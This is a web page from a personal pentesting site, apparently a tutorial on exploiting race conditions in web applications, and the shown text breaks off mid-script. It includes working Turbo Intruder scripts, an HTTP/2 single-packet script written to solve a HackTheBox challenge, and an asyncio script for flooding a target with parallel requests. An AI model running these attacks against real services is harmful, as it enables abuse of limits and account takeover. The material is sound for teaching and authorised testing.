<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Rare Condition | 47z!h4Ck </title> <meta name="author" content="47z!Lu7h "> <meta name="description" content=""> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%E2%9A%9B%EF%B8%8F&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://47z1lu7h.github.io/projects/pentesting-web/2025-01-01-race-condition/"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?0afe9f0ae161375728f7bcc5eb5b4ab4"></script> </head> <body class="fixed-top-nav sticky-bottom-footer"> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> 47z!h4Ck </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">h0m3 </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item active"> <a class="nav-link" href="/projects/">projects <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repositories </a> </li> <li class="nav-item "> <a class="nav-link" href="/cv/">cv </a> </li> <li class="nav-item "> <a class="nav-link" href="/teaching/">teaching </a> </li> <li class="nav-item "> <a class="nav-link" href="/people/">people </a> </li> <li class="nav-item "> <a class="nav-link" href="/hacking/">hacking </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">submenus </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <a class="dropdown-item " href="/publications/">publications</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/projects/">projects</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/blog/">blog</a> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fa-solid fa-moon"></i> <i class="fa-solid fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"> <div class="post"> <header class="post-header"> <h1 class="post-title">Rare Condition</h1> <p class="post-description"></p> </header> <article> <h1 id="race-condition">Race Condition</h1> <blockquote> <p>[!WARNING] For obtaining a deep understanding of this technique check the original report in <a href="https://portswigger.net/research/smashing-the-state-machine" rel="external nofollow noopener" target="_blank">https://portswigger.net/research/smashing-the-state-machine</a></p> </blockquote> <h2 id="enhancing-race-condition-attacks">Enhancing Race Condition Attacks</h2> <p>The main hurdle in taking advantage of race conditions is making sure that multiple requests are handled at the same time, with <strong>very little difference in their processing times—ideally, less than 1ms</strong>.</p> <p>Here you can find some techniques for Synchronizing Requests:</p> <h4 id="http2-single-packet-attack-vs-http11-last-byte-synchronization">HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization</h4> <ul> <li> <strong>HTTP/2</strong>: Supports sending two requests over a single TCP connection, reducing network jitter impact. However, due to server-side variations, two requests may not suffice for a consistent race condition exploit.</li> <li> <strong>HTTP/1.1 ‘Last-Byte Sync’</strong>: Enables the pre-sending of most parts of 20-30 requests, withholding a small fragment, which is then sent together, achieving simultaneous arrival at the server.</li> </ul> <p><strong>Preparation for Last-Byte Sync</strong> involves:</p> <ol> <li>Sending headers and body data minus the final byte without ending the stream.</li> <li>Pausing for 100ms post-initial send.</li> <li>Disabling TCP_NODELAY to utilize Nagle’s algorithm for batching final frames.</li> <li>Pinging to warm up the connection.</li> </ol> <p>The subsequent sending of withheld frames should result in their arrival in a single packet, verifiable via Wireshark. This method does not apply to static files, which are not typically involved in RC attacks.</p> <h3 id="adapting-to-server-architecture">Adapting to Server Architecture</h3> <p>Understanding the target’s architecture is crucial. Front-end servers might route requests differently, affecting timing. Preemptive server-side connection warming, through inconsequential requests, might normalize request timing.</p> <h4 id="handling-session-based-locking">Handling Session-Based Locking</h4> <p>Frameworks like PHP’s session handler serialize requests by session, potentially obscuring vulnerabilities. Utilizing different session tokens for each request can circumvent this issue.</p> <h4 id="overcoming-rate-or-resource-limits">Overcoming Rate or Resource Limits</h4> <p>If connection warming is ineffective, triggering web servers’ rate or resource limit delays intentionally through a flood of dummy requests might facilitate the single-packet attack by inducing a server-side delay conducive to race conditions.</p> <h2 id="attack-examples">Attack Examples</h2> <ul> <li> <strong>Tubo Intruder - HTTP2 single-packet attack (1 endpoint)</strong>: You can send the request to <strong>Turbo intruder</strong> (<code class="language-plaintext highlighter-rouge">Extensions</code> -&gt; <code class="language-plaintext highlighter-rouge">Turbo Intruder</code> -&gt; <code class="language-plaintext highlighter-rouge">Send to Turbo Intruder</code>), you can change in the request the value you want to brute force for <strong><code class="language-plaintext highlighter-rouge">%s</code></strong> like in <code class="language-plaintext highlighter-rouge">csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&amp;username=carlos&amp;password=%s</code> and then select the <strong><code class="language-plaintext highlighter-rouge">examples/race-single-packer-attack.py</code></strong> from the drop down:</li> </ul> <figure><img src="../images/image%20(57).png" alt=""><figcaption></figcaption></figure> <p>If you are going to <strong>send different values</strong>, you could modify the code with this one that uses a wordlist from the clipboard:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">passwords</span> <span class="o">=</span> <span class="n">wordlists</span><span class="p">.</span><span class="n">clipboard</span>
    <span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">passwords</span><span class="p">:</span>
        <span class="n">engine</span><span class="p">.</span><span class="nf">queue</span><span class="p">(</span><span class="n">target</span><span class="p">.</span><span class="n">req</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">gate</span><span class="o">=</span><span class="sh">'</span><span class="s">race1</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div></div> <blockquote> <p>[!WARNING] If the web doesn’t support HTTP2 (only HTTP1.1) use <code class="language-plaintext highlighter-rouge">Engine.THREADED</code> or <code class="language-plaintext highlighter-rouge">Engine.BURP</code> instead of <code class="language-plaintext highlighter-rouge">Engine.BURP2</code>.</p> </blockquote> <ul> <li> <strong>Tubo Intruder - HTTP2 single-packet attack (Several endpoints)</strong>: In case you need to send a request to 1 endpoint and then multiple to other endpoints to trigger the RCE, you can change the <code class="language-plaintext highlighter-rouge">race-single-packet-attack.py</code> script with something like:</li> </ul> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">queueRequests</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">wordlists</span><span class="p">):</span>
    <span class="n">engine</span> <span class="o">=</span> <span class="nc">RequestEngine</span><span class="p">(</span><span class="n">endpoint</span><span class="o">=</span><span class="n">target</span><span class="p">.</span><span class="n">endpoint</span><span class="p">,</span>
                           <span class="n">concurrentConnections</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
                           <span class="n">engine</span><span class="o">=</span><span class="n">Engine</span><span class="p">.</span><span class="n">BURP2</span>
                           <span class="p">)</span>

    <span class="c1"># Hardcode the second request for the RC
</span>    <span class="n">confirmationReq</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

</span><span class="sh">'''</span>

    <span class="c1"># For each attempt (20 in total) send 50 confirmation requests.
</span>    <span class="k">for</span> <span class="n">attempt</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">20</span><span class="p">):</span>
        <span class="n">currentAttempt</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">attempt</span><span class="p">)</span>
        <span class="n">username</span> <span class="o">=</span> <span class="sh">'</span><span class="s">aUser</span><span class="sh">'</span> <span class="o">+</span> <span class="n">currentAttempt</span>

        <span class="c1"># queue a single registration request
</span>        <span class="n">engine</span><span class="p">.</span><span class="nf">queue</span><span class="p">(</span><span class="n">target</span><span class="p">.</span><span class="n">req</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">gate</span><span class="o">=</span><span class="n">currentAttempt</span><span class="p">)</span>

        <span class="c1"># queue 50 confirmation requests - note that this will probably sent in two separate packets
</span>        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">50</span><span class="p">):</span>
            <span class="n">engine</span><span class="p">.</span><span class="nf">queue</span><span class="p">(</span><span class="n">confirmationReq</span><span class="p">,</span> <span class="n">gate</span><span class="o">=</span><span class="n">currentAttempt</span><span class="p">)</span>

        <span class="c1"># send all the queued requests for this attempt
</span>        <span class="n">engine</span><span class="p">.</span><span class="nf">openGate</span><span class="p">(</span><span class="n">currentAttempt</span><span class="p">)</span>
</code></pre></div></div> <ul> <li>It’s also available in <strong>Repeater</strong> via the new ‘<strong>Send group in parallel</strong>’ option in Burp Suite. <ul> <li>For <strong>limit-overrun</strong> you could just add the <strong>same request 50 times</strong> in the group.</li> <li>For <strong>connection warming</strong>, you could <strong>add</strong> at the <strong>beginning</strong> of the <strong>group</strong> some <strong>requests</strong> to some non static part of the web server.</li> <li>For <strong>delaying</strong> the process <strong>between</strong> processing <strong>one request and another</strong> in a 2 substates steps, you could <strong>add extra requests between</strong> both requests.</li> <li>For a <strong>multi-endpoint</strong> RC you could start sending the <strong>request</strong> that <strong>goes to the hidden state</strong> and then <strong>50 requests</strong> just after it that <strong>exploits the hidden state</strong>.</li> </ul> </li> </ul> <figure><img src="../images/image%20(58).png" alt=""><figcaption></figcaption></figure> <ul> <li> <strong>Automated python script</strong>: The goal of this script is to change the email of a user while continually verifying it until the verification token of the new email arrives to the last email (this is because in the code it was seeing a RC where it was possible to modify an email but have the verification sent to the old one because the variable indicating the email was already populated with the first one).<br> When the word “objetivo” is found in the received emails we know we received the verification token of the changed email and we end the attack.</li> </ul> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
</span><span class="kn">from</span> <span class="n">h2spacex</span> <span class="kn">import</span> <span class="n">H2OnTlsConnection</span>
<span class="kn">from</span> <span class="n">time</span> <span class="kn">import</span> <span class="n">sleep</span>
<span class="kn">from</span> <span class="n">h2spacex</span> <span class="kn">import</span> <span class="n">h2_frames</span>
<span class="kn">import</span> <span class="n">requests</span>

<span class="n">cookie</span><span class="o">=</span><span class="sh">"</span><span class="s">session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg</span><span class="sh">"</span>

<span class="c1"># change these headers
</span>
<span class="n">headersObjetivo</span><span class="o">=</span> <span class="sh">"""</span><span class="s">accept: */*
content-type: application/x-www-form-urlencoded
Cookie: </span><span class="sh">"""</span><span class="o">+</span><span class="n">cookie</span><span class="o">+</span><span class="sh">"""</span><span class="s">
Content-Length: 112
</span><span class="sh">"""</span>

<span class="n">bodyObjetivo</span> <span class="o">=</span> <span class="sh">'</span><span class="s">email=objetivo%40apexsurvive.htb&amp;username=estes&amp;fullName=test&amp;antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827</span><span class="sh">'</span>

<span class="n">headersVerification</span><span class="o">=</span> <span class="sh">"""</span><span class="s">Content-Length: 1
Cookie: </span><span class="sh">"""</span><span class="o">+</span><span class="n">cookie</span><span class="o">+</span><span class="sh">"""</span><span class="s">
</span><span class="sh">"""</span>
<span class="n">CSRF</span><span class="o">=</span><span class="sh">"</span><span class="s">42a08872-610a-4965-9553-22d7b3aa1827</span><span class="sh">"</span>

<span class="n">host</span> <span class="o">=</span> <span class="sh">"</span><span class="s">94.237.56.46</span><span class="sh">"</span>
<span class="n">puerto</span> <span class="o">=</span><span class="mi">39697</span>


<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">https://</span><span class="sh">"</span><span class="o">+</span><span class="n">host</span><span class="o">+</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">puerto</span><span class="p">)</span><span class="o">+</span><span class="sh">"</span><span class="s">/email/</span><span class="sh">"</span>

<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>


<span class="k">while</span> <span class="sh">"</span><span class="s">objetivo</span><span class="sh">"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>

    <span class="n">urlDeleteMails</span> <span class="o">=</span> <span class="sh">"</span><span class="s">https://</span><span class="sh">"</span><span class="o">+</span><span class="n">host</span><span class="o">+</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">puerto</span><span class="p">)</span><span class="o">+</span><span class="sh">"</span><span class="s">/email/deleteall/</span><span class="sh">"</span>

    <span class="n">responseDeleteMails</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">urlDeleteMails</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
    <span class="c1">#print(response.text)
</span>    <span class="c1"># change this host name to new generated one
</span>
    <span class="n">Headers</span> <span class="o">=</span> <span class="p">{</span> <span class="sh">"</span><span class="s">Cookie</span><span class="sh">"</span> <span class="p">:</span> <span class="n">cookie</span><span class="p">,</span> <span class="sh">"</span><span class="s">content-type</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">application/x-www-form-urlencoded</span><span class="sh">"</span> <span class="p">}</span>
    <span class="n">data</span><span class="o">=</span><span class="sh">"</span><span class="s">email=test%40email.htb&amp;username=estes&amp;fullName=test&amp;antiCSRFToken=</span><span class="sh">"</span><span class="o">+</span><span class="n">CSRF</span>
    <span class="n">urlReset</span><span class="o">=</span><span class="sh">"</span><span class="s">https://</span><span class="sh">"</span><span class="o">+</span><span class="n">host</span><span class="o">+</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">puerto</span><span class="p">)</span><span class="o">+</span><span class="sh">"</span><span class="s">/challenge/api/profile</span><span class="sh">"</span>
    <span class="n">responseReset</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">urlReset</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">Headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

    <span class="nf">print</span><span class="p">(</span><span class="n">responseReset</span><span class="p">.</span><span class="n">status_code</span><span class="p">)</span>

    <span class="n">h2_conn</span> <span class="o">=</span> <span class="nc">H2OnTlsConnection</span><span class="p">(</span>
        <span class="n">hostname</span><span class="o">=</span><span class="n">host</span><span class="p">,</span>
        <span class="n">port_number</span><span class="o">=</span><span class="n">puerto</span>
    <span class="p">)</span>

    <span class="n">h2_conn</span><span class="p">.</span><span class="nf">setup_connection</span><span class="p">()</span>

    <span class="n">try_num</span> <span class="o">=</span> <span class="mi">100</span>

    <span class="n">stream_ids_list</span> <span class="o">=</span> <span class="n">h2_conn</span><span class="p">.</span><span class="nf">generate_stream_ids</span><span class="p">(</span><span class="n">number_of_streams</span><span class="o">=</span><span class="n">try_num</span><span class="p">)</span>

    <span class="n">all_headers_frames</span> <span class="o">=</span> <span class="p">[]</span>  <span class="c1"># all headers frame + data frames which have not the last byte
</span>    <span class="n">all_data_frames</span> <span class="o">=</span> <span class="p">[]</span>  <span class="c1"># all data frames which contain the last byte
</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">try_num</span><span class="p">):</span>
        <span class="n">last_data_frame_with_last_byte</span><span class="o">=</span><span class="sh">''</span>
        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="n">try_num</span><span class="o">/</span><span class="mi">2</span><span class="p">:</span>
            <span class="n">header_frames_without_last_byte</span><span class="p">,</span> <span class="n">last_data_frame_with_last_byte</span> <span class="o">=</span> <span class="n">h2_conn</span><span class="p">.</span><span class="nf">create_single_packet_http2_post_request_frames</span><span class="p">(</span>  <span class="c1"># noqa: E501
</span>                <span class="n">method</span><span class="o">=</span><span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">,</span>
                <span class="n">headers_string</span><span class="o">=</span><span class="n">headersObjetivo</span><span class="p">,</span>
                <span class="n">scheme</span><span class="o">=</span><span class="sh">'</span><span class="s">https</span><span class="sh">'</span><span class="p">,</span>
                <span class="n">stream_id</span><span class="o">=</span><span class="n">stream_ids_list</span><span class="p">[</span><span class="n">i</span><span class="p">],</span>
                <span class="n">authority</span><span class="o">=</span><span class="n">host</span><span class="p">,</span>
                <span class="n">body</span><span class="o">=</span><span class="n">bodyObjetivo</span><span class="p">,</span>
                <span class="n">path</span><span class="o">=</span><span class="sh">'</span><span class="s">/challenge/api/profile</span><span class="sh">'</span>
            <span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">header_frames_without_last_byte</span><span class="p">,</span> <span class="n">last_data_frame_with_last_byte</span> <span class="o">=</span> <span class="n">h2_conn</span><span class="p">.</span><span class="nf">create_single_packet_http2_post_request_frames</span><span class="p">(</span>
                <span class="n">method</span><span class="o">=</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span>
                <span class="n">headers_string</span><span class="o">=</span><span class="n">headersVerification</span><span class="p">,</span>
                <span class="n">scheme</span><span class="o">=</span><span class="sh">'</span><span class="s">https</span><span class="sh">'</span><span class="p">,</span>
                <span class="n">stream_id</span><span class="o">=</span><span class="n">stream_ids_list</span><span class="p">[</span><span class="n">i</span><span class="p">],</span>
                <span class="n">authority</span><span class="o">=</span><span class="n">host</span><span class="p">,</span>
                <span class="n">body</span><span class="o">=</span><span class="sh">"</span><span class="s">.</span><span class="sh">"</span><span class="p">,</span>
                <span class="n">path</span><span class="o">=</span><span class="sh">'</span><span class="s">/challenge/api/sendVerification</span><span class="sh">'</span>
            <span class="p">)</span>

        <span class="n">all_headers_frames</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">header_frames_without_last_byte</span><span class="p">)</span>
        <span class="n">all_data_frames</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">last_data_frame_with_last_byte</span><span class="p">)</span>


    <span class="c1"># concatenate all headers bytes
</span>    <span class="n">temp_headers_bytes</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">''</span>
    <span class="k">for</span> <span class="n">h</span> <span class="ow">in</span> <span class="n">all_headers_frames</span><span class="p">:</span>
        <span class="n">temp_headers_bytes</span> <span class="o">+=</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">h</span><span class="p">)</span>

    <span class="c1"># concatenate all data frames which have last byte
</span>    <span class="n">temp_data_bytes</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">''</span>
    <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">all_data_frames</span><span class="p">:</span>
        <span class="n">temp_data_bytes</span> <span class="o">+=</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">d</span><span class="p">)</span>

    <span class="n">h2_conn</span><span class="p">.</span><span class="nf">send_bytes</span><span class="p">(</span><span class="n">temp_headers_bytes</span><span class="p">)</span>

    <span class="c1"># wait some time
</span>    <span class="nf">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>

    <span class="c1"># send ping frame to warm up connection
</span>    <span class="n">h2_conn</span><span class="p">.</span><span class="nf">send_ping_frame</span><span class="p">()</span>

    <span class="c1"># send remaining data frames
</span>    <span class="n">h2_conn</span><span class="p">.</span><span class="nf">send_bytes</span><span class="p">(</span><span class="n">temp_data_bytes</span><span class="p">)</span>

    <span class="n">resp</span> <span class="o">=</span> <span class="n">h2_conn</span><span class="p">.</span><span class="nf">read_response_from_socket</span><span class="p">(</span><span class="n">_timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">frame_parser</span> <span class="o">=</span> <span class="n">h2_frames</span><span class="p">.</span><span class="nc">FrameParser</span><span class="p">(</span><span class="n">h2_connection</span><span class="o">=</span><span class="n">h2_conn</span><span class="p">)</span>
    <span class="n">frame_parser</span><span class="p">.</span><span class="nf">add_frames</span><span class="p">(</span><span class="n">resp</span><span class="p">)</span>
    <span class="n">frame_parser</span><span class="p">.</span><span class="nf">show_response_of_sent_requests</span><span class="p">()</span>

    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">---</span><span class="sh">'</span><span class="p">)</span>

    <span class="nf">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">h2_conn</span><span class="p">.</span><span class="nf">close_connection</span><span class="p">()</span>

    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
</code></pre></div></div> <h3 id="improving-single-packet-attack">Improving Single Packet Attack</h3> <p>In the original research it’s explained that this attack has a limit of 1,500 bytes. However, in <a href="https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/" rel="external nofollow noopener" target="_blank"><strong>this post</strong></a>, it was explained how it’s possible to extend the 1,500-byte limitation of the single packet attack to the <strong>65,535 B window limitation of TCP by using IP layer fragmentation</strong> (splitting a single packet into multiple IP packets) and sending them in different order, allowed to prevent reassembling the packet until all the fragments reached the server. This technique allowed the researcher to send 10,000 requests in about 166ms.</p> <p>Note that although this improvement makes the attack more reliable in RC that requiers hundreds/thousands of packets to arrive at the same time, it might also have some software limitations. Some popular HTTP servers like Apache, Nginx and Go have a strict <code class="language-plaintext highlighter-rouge">SETTINGS_MAX_CONCURRENT_STREAMS</code> setting to 100, 128 and 250. However, other like NodeJS and nghttp2 has it unlimited.<br> This basically mean that Apache will only consider 100 HTTP connections from a single TCP connection (limiting this RC attack).</p> <p>You can find some examples using this tehcnique in the repo <a href="https://github.com/Ry0taK/first-sequence-sync/tree/main" rel="external nofollow noopener" target="_blank">https://github.com/Ry0taK/first-sequence-sync/tree/main</a>.</p> <h2 id="raw-bf">Raw BF</h2> <p>Before the previous research these were some payloads used which just tried to send the packets as fast as possible to cause a RC.</p> <ul> <li> <strong>Repeater:</strong> Check the examples from the previous section.</li> <li> <strong>Intruder</strong>: Send the <strong>request</strong> to <strong>Intruder</strong>, set the <strong>number of threads</strong> to <strong>30</strong> inside the <strong>Options menu and,</strong> select as payload <strong>Null payloads</strong> and generate <strong>30.</strong> </li> <li><strong>Turbo Intruder</strong></li> </ul> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">queueRequests</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">wordlists</span><span class="p">):</span>
    <span class="n">engine</span> <span class="o">=</span> <span class="nc">RequestEngine</span><span class="p">(</span><span class="n">endpoint</span><span class="o">=</span><span class="n">target</span><span class="p">.</span><span class="n">endpoint</span><span class="p">,</span>
                           <span class="n">concurrentConnections</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span>
                           <span class="n">requestsPerConnection</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
                           <span class="n">pipeline</span><span class="o">=</span><span class="bp">False</span>
                           <span class="p">)</span>
    <span class="n">a</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">Session=&lt;session_id_1&gt;</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">Session=&lt;session_id_2&gt;</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">Session=&lt;session_id_3&gt;</span><span class="sh">'</span><span class="p">]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">a</span><span class="p">)):</span>
        <span class="n">engine</span><span class="p">.</span><span class="nf">queue</span><span class="p">(</span><span class="n">target</span><span class="p">.</span><span class="n">req</span><span class="p">,</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">gate</span><span class="o">=</span><span class="sh">'</span><span class="s">race1</span><span class="sh">'</span><span class="p">)</span>
    <span class="c1"># open TCP connections and send partial requests
</span>    <span class="n">engine</span><span class="p">.</span><span class="nf">start</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
    <span class="n">engine</span><span class="p">.</span><span class="nf">openGate</span><span class="p">(</span><span class="sh">'</span><span class="s">race1</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">engine</span><span class="p">.</span><span class="nf">complete</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">60</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">handleResponse</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">interesting</span><span class="p">):</span>
    <span class="n">table</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
</code></pre></div></div> <ul> <li><strong>Python - asyncio</strong></li> </ul> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">asyncio</span>
<span class="kn">import</span> <span class="n">httpx</span>

<span class="k">async</span> <span class="k">def</span> <span class="nf">use_code</span><span class="p">(</span><span class="n">client</span><span class="p">):</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="k">await</span> <span class="n">client</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">http://victim.com</span><span class="sh">'</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">session</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">asdasdasd</span><span class="sh">"</span><span class="p">},</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">code</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">123123123</span><span class="sh">"</span><span class="p">})</span>
    <span class="k">return</span> <span class="n">resp</span><span class="p">.</span><span class="n">text</span>

<span class="k">async</span> <span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="k">async</span> <span class="k">with</span> <span class="n">httpx</span><span class="p">.</span><span class="nc">AsyncClient</span><span class="p">()</span> <span class="k">as</span> <span class="n">client</span><span class="p">:</span>
        <span class="n">tasks</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">20</span><span class="p">):</span> <span class="c1">#20 times
</span>            <span class="n">tasks</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">asyncio</span><span class="p">.</span><span class="nf">ensure_future</span><span class="p">(</span><span class="nf">use_code</span><span class="p">(</span><span class="n">client</span><span class="p">)))</span>

        <span class="c1"># Get responses
